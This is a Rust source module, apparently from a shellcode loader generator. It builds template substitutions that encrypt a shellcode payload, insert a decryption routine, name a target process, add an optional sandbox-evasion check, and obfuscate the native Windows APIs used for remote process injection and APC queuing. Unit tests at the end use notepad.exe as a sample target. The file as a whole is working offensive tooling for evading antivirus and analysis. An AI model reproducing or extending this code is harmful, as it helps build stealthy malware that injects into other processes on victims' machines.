//! Placeholder substitution map construction.
//!
//! Builds the `{{KEY}} -> value` map that is applied to template files.
//! Each function here is responsible for one category of replacement
//! (encryption output, target process, sandbox, API obfuscation).

use crate::config::{Encryption, Order};
use crate::obfuscation::{non_zero_random_key, obfuscate_api_name, obfuscate_string_for_template};
use crate::sandbox::build_sandbox;
use anyhow::{Context, Result};
use std::collections::HashMap;
use std::path::Path;

const LITCRYPT_DEPENDENCY: &str = r#"litcrypt = "0.4""#;
const LITCRYPT_SETUP: &str = "#[macro_use]\nextern crate litcrypt;\n\nuse_litcrypt!();";
const COMMON_MODULE_DECL: &str = "mod common;";

pub(super) fn build_dependencies(template_dependencies: Option<String>) -> String {
    match template_dependencies {
        Some(deps) if !deps.trim().is_empty() => {
            format!("{}\n{}", LITCRYPT_DEPENDENCY, deps)
        }
        _ => LITCRYPT_DEPENDENCY.to_string(),
    }
}

pub fn get_encrypted_filename(encryption: &Encryption) -> &'static str {
    match encryption {
        Encryption::Xor => "input.xor",
        Encryption::Aes => "input.aes",
        Encryption::Uuid => "input.uuid",
    }
}

fn build_encrypted_output(
    order: &Order,
    src_dir: &Path,
) -> Result<(crate::encryption::EncryptionOutput, String)> {
    let filename = get_encrypted_filename(&order.encryption);
    let path = src_dir.join(filename);
    let include_path = format!("\"{}\"", filename);
    let output =
        crate::encryption::encrypt_shellcode(&order.shellcode_path, &path, order.encryption)
            .context("Failed to encrypt shellcode")?;
    Ok((output, include_path))
}

fn build_basic_replacements(
    enc_output: crate::encryption::EncryptionOutput,
    include_path: String,
) -> HashMap<&'static str, String> {
    let dependencies = build_dependencies(enc_output.dependencies);
    let mut replacements = HashMap::new();
    replacements.insert("{{PATH_TO_SHELLCODE}}", include_path);
    replacements.insert("{{DECRYPTION_FUNCTION}}", enc_output.decryption_function);
    replacements.insert("{{MAIN}}", enc_output.main);
    replacements.insert("{{DEPENDENCIES}}", dependencies);
    replacements.insert("{{IMPORTS}}", enc_output.imports.unwrap_or_default());
    replacements.insert("{{LITCRYPT_SETUP}}", LITCRYPT_SETUP.to_string());
    replacements.insert("{{COMMON_MODULE}}", COMMON_MODULE_DECL.to_string());
    replacements.insert("{{DLL_MAIN}}", String::new());
    replacements.insert("{{DLL_FORMAT}}", String::new());
    replacements
}

fn add_target_process_replacement(replacements: &mut HashMap<&'static str, String>, target: &str) {
    replacements.insert("{{TARGET_PROCESS}}", obfuscate_string_for_template(target));
}

fn add_sandbox_replacements(replacements: &mut HashMap<&'static str, String>, domain: &str) {
    let sandbox_output = build_sandbox(domain);
    replacements.insert("{{SANDBOX}}", sandbox_output.sandbox_function);
    replacements.insert("{{SANDBOX_IMPORTS}}", sandbox_output.sandbox_import);
}

fn add_api_obfuscation_replacements(replacements: &mut HashMap<&'static str, String>) {
    let key = non_zero_random_key();
    replacements.insert("{{API_KEY}}", format!("0x{:02x}", key));
    replacements.insert(
        "{{OBF_NT_OPEN_PROCESS}}",
        obfuscate_api_name("NtOpenProcess", key),
    );
    replacements.insert(
        "{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}}",
        obfuscate_api_name("NtAllocateVirtualMemory", key),
    );
    replacements.insert(
        "{{OBF_NT_WRITE_VIRTUAL_MEMORY}}",
        obfuscate_api_name("NtWriteVirtualMemory", key),
    );
    replacements.insert(
        "{{OBF_NT_PROTECT_VIRTUAL_MEMORY}}",
        obfuscate_api_name("NtProtectVirtualMemory", key),
    );
    replacements.insert(
        "{{OBF_NT_CREATE_THREAD_EX}}",
        obfuscate_api_name("NtCreateThreadEx", key),
    );
    replacements.insert(
        "{{OBF_NT_QUEUE_APC_THREAD}}",
        obfuscate_api_name("NtQueueApcThread", key),
    );
    replacements.insert(
        "{{OBF_NT_TEST_ALERT}}",
        obfuscate_api_name("NtTestAlert", key),
    );
    replacements.insert(
        "{{OBF_NT_DELAY_EXECUTION}}",
        obfuscate_api_name("NtDelayExecution", key),
    );
}

/// Build the full replacement map for a given order.
pub(super) fn build_replacements(
    order: &Order,
    src_dir: &Path,
) -> Result<HashMap<&'static str, String>> {
    let (enc_output, include_path) = build_encrypted_output(order, src_dir)?;
    let mut replacements = build_basic_replacements(enc_output, include_path);
    add_target_process_replacement(&mut replacements, &order.target_process);

    // Always add sandbox replacements (empty if no sandbox specified)
    if let Some(ref domain) = order.sandbox {
        add_sandbox_replacements(&mut replacements, domain);
    } else {
        replacements.insert("{{SANDBOX}}", String::new());
        replacements.insert("{{SANDBOX_IMPORTS}}", String::new());
    }

    add_api_obfuscation_replacements(&mut replacements);
    Ok(replacements)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::Encryption;
    use std::collections::HashMap;

    #[test]
    fn test_build_dependencies() {
        assert_eq!(build_dependencies(None), r#"litcrypt = "0.4""#);
        assert_eq!(
            build_dependencies(Some(r#"libaes = "0.7""#.to_string())),
            "litcrypt = \"0.4\"\nlibaes = \"0.7\""
        );
    }

    #[test]
    fn test_get_encrypted_filename() {
        assert_eq!(get_encrypted_filename(&Encryption::Xor), "input.xor");
        assert_eq!(get_encrypted_filename(&Encryption::Aes), "input.aes");
        assert_eq!(get_encrypted_filename(&Encryption::Uuid), "input.uuid");
    }

    #[test]
    fn test_build_basic_replacements() {
        let enc_output = crate::encryption::EncryptionOutput {
            decryption_function: "fn dec()".to_string(),
            main: "main()".to_string(),
            dependencies: Some("dep = \"1.0\"".to_string()),
            imports: Some("use std::;".to_string()),
        };
        let replacements = build_basic_replacements(enc_output, "input.xor".to_string());
        assert!(replacements.contains_key("{{PATH_TO_SHELLCODE}}"));
        assert!(replacements.contains_key("{{DECRYPTION_FUNCTION}}"));
    }

    #[test]
    fn test_add_target_process_replacement() {
        let mut replacements = HashMap::new();
        add_target_process_replacement(&mut replacements, "notepad.exe");
        assert!(replacements.contains_key("{{TARGET_PROCESS}}"));
    }

    #[test]
    fn test_add_api_obfuscation_replacements() {
        let mut replacements = HashMap::new();
        add_api_obfuscation_replacements(&mut replacements);
        assert!(replacements.contains_key("{{API_KEY}}"));
        assert!(replacements.contains_key("{{OBF_NT_OPEN_PROCESS}}"));
    }
}
